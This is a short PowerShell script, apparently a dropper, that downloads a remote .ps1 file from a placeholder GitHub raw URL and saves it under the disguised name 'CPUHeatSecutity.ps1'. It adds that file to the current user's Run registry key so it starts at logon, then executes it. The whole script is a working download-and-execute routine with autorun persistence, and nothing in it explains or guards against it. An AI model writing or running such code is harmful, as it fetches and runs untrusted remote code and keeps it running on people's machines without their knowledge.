$githubUrl = "https://raw.githubusercontent.com/NomUtilisateur/NomRepo/master/monscript.ps1"
$destinationPath = "C:\Chemin\Vers\Le\Fichier\CPUHeatSecutity.ps1"
$autorunRegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$autorunRegistryName = "CPUHeatSecurity"

Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath

Set-ItemProperty -Path $autorunRegistryPath -Name $autorunRegistryName -Value $destinationPath

Invoke-Expression -Command $destinationPath
